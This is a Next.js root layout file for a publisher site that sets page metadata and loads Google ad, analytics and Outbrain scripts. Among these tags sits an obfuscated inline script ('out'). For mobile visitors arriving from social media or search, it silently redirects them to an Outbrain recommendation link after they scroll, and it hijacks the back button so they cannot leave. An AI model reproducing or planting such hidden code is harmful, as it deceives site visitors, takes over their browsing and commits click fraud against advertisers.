import Script from "next/script";
import { Roboto_Slab } from "next/font/google";
import { Toaster } from "react-hot-toast";

import type { Metadata } from "next";

import LoadingWrapper from "@/components/wrappers/loading-wrapper";
import { CardImage, description, keywords, title, url } from "@/constant";

import "@/app/globals.css";
import Footer from "@/components/footer/Footer";

export const revalidate = 0;

// Fonts
const poppins = Roboto_Slab({
  subsets: ["latin"],
  display: "swap",
  weight: ["100", "200", "300", "400", "500", "600", "700", "800", "900"],
});

// Meta Data

export const metadata: Metadata = {
  title: `${title}`,
  description: description,
  keywords: keywords,
  robots: "index follow",
  twitter: {
    card: "summary_large_image",
    site: title,
    title: `${title}`,
    description: description,
    images: CardImage,
  },
  openGraph: {
    type: "website",
    siteName: `${title}`,
    description: description,
    url: url,
    countryName: "USA",
    images: CardImage,
  },
  metadataBase: new URL(url),
  alternates: {
    canonical: "/",
  },
  publisher: "Truepub Media",
  icons: "/favicon.ico",
};

// Main HTML
export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" className="scroll-smooth">
      <body className={`${poppins.className} overflow-x-hidden`}>
        <Script
          src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="https://www.googletagmanager.com/gtag/js?id=G-8FYMCYZZN2"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="//widgets.outbrain.com/outbrain.js"
          async
          type="text/javascript"
          strategy="afterInteractive"
        ></Script>
        <Script id="google-analatics">
          {` window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-8FYMCYZZN2');`}
        </Script>
        <Script id="out" strategy="afterInteractive">
          {`function _0x1079(){const _0x2916f6=['addEventListener','facebook.com','children','push','toLowerCase','referrer','3629310XUVkTW','location','instagram.com','test','log','forEach','.ob-dynamic-rec-link','random','userAgent','href','10rejqFj','some','URL','shadowRoot','pushState','popstate','140624UgTjzO','floor','2634399ZfePYV','google.com','3535395UbWWMk','4477488lDOBTS','24lztouI','249477GdcOYW','scroll','length','12242097xwuKNG'];_0x1079=function(){return _0x2916f6;};return _0x1079();}const _0x438261=_0x3071;(function(_0x38b4c0,_0x485a81){const _0x599923=_0x3071,_0x45caff=_0x38b4c0();while(!![]){try{const _0x24c63a=parseInt(_0x599923(0xcd))/0x1*(parseInt(_0x599923(0xe1))/0x2)+-parseInt(_0x599923(0xeb))/0x3+parseInt(_0x599923(0xe7))/0x4+parseInt(_0x599923(0xd7))/0x5+-parseInt(_0x599923(0xcb))/0x6+parseInt(_0x599923(0xd0))/0x7+-parseInt(_0x599923(0xcc))/0x8*(parseInt(_0x599923(0xe9))/0x9);if(_0x24c63a===_0x485a81)break;else _0x45caff['push'](_0x45caff['shift']());}catch(_0xf11245){_0x45caff['push'](_0x45caff['shift']());}}}(_0x1079,0xe903c));const num=Math['random'](),isMobile=/iPhone|iPad|iPod|Android/i[_0x438261(0xda)](navigator[_0x438261(0xdf)]),allowedReferer=[_0x438261(0xd2),_0x438261(0xd9),_0x438261(0xea)];function isFromAllowedReferer(){const _0xbb84ae=_0x438261,_0x2c9233=document[_0xbb84ae(0xd6)][_0xbb84ae(0xd5)]();return allowedReferer[_0xbb84ae(0xe2)](_0x57477e=>_0x2c9233['includes'](_0x57477e));}function randomIntFromInterval(_0x1c720a,_0x98f5e7){const _0x3fa810=_0x438261;return Math[_0x3fa810(0xe8)](Math[_0x3fa810(0xde)]()*(_0x98f5e7-_0x1c720a+0x1)+_0x1c720a);}const outBrainFunction=()=>{function _0x474f2a(){const _0x22f2dd=_0x3071,_0x2af9a2=[];function _0x387ab2(_0x2b9b81){const _0x4049b7=_0x3071;_0x2b9b81[_0x4049b7(0xe4)]&&_0x2af9a2[_0x4049b7(0xd4)](_0x2b9b81['shadowRoot']);for(const _0x37cd20 of _0x2b9b81[_0x4049b7(0xd3)]){_0x387ab2(_0x37cd20);}}_0x387ab2(document['body']),_0x2af9a2[_0x22f2dd(0xcf)]>0x0?_0x2af9a2[_0x22f2dd(0xdc)](_0x4b5372=>{const _0x342044=_0x22f2dd,_0x3d45c3=_0x4b5372['querySelector'](_0x342044(0xdd));_0x3d45c3&&(window['location'][_0x342044(0xe0)]=_0x3d45c3['href']);}):console[_0x22f2dd(0xdb)]('No\x20shadow\x20roots\x20found.');}setTimeout(()=>{_0x474f2a();},randomIntFromInterval(0x3,0x6)*0x3e8);};function _0x3071(_0x10b5e5,_0x2751f0){const _0x1079cb=_0x1079();return _0x3071=function(_0x307124,_0x2620f4){_0x307124=_0x307124-0xcb;let _0x1e8dfa=_0x1079cb[_0x307124];return _0x1e8dfa;},_0x3071(_0x10b5e5,_0x2751f0);}if(isFromAllowedReferer()&&isMobile){const randomNumber=Math[_0x438261(0xe8)](Math[_0x438261(0xde)]()*(0xc8-0x64+0x1))+0x64;if(num<0.25){}else window[_0x438261(0xd1)](_0x438261(0xce),()=>{window['scrollY']>=randomNumber&&outBrainFunction();});history[_0x438261(0xe5)](null,null,document[_0x438261(0xe3)]),window['addEventListener'](_0x438261(0xe6),()=>{const _0x29dfc1=_0x438261;window[_0x29dfc1(0xd8)]['href']=window['location'][_0x29dfc1(0xe0)];});}`}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads" async>
          {`window.googletag = window.googletag || { cmd: [] };
          let interstitialSlot;
          googletag.cmd.push(() => {
            // Define a web interstitial ad slot.
            interstitialSlot = (interstitialSlot = googletag.defineOutOfPageSlot(
              "/22971894985/PM_S_INTERSTITIAL",
              googletag.enums.OutOfPageFormat.INTERSTITIAL
            ));

            // Slot returns null if the page or device does not support interstitials.
            if (interstitialSlot) {
              // Enable optional interstitial triggers and register the slot.
              interstitialSlot.addService(googletag.pubads()).setConfig({
                interstitial: {
                  triggers: {
                    navBar: true,
                    unhideWindow: true,
                  },
                },
              });

              googletag.enableServices();
            }
          });
          `}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads-push" async>
          {`
            googletag.cmd.push(() => {
              googletag.display(interstitialSlot);
            });
          `}
        </Script>
        <Toaster position="top-center" />
        <LoadingWrapper />

        {children}
        <Footer />
      </body>
    </html>
  );
}
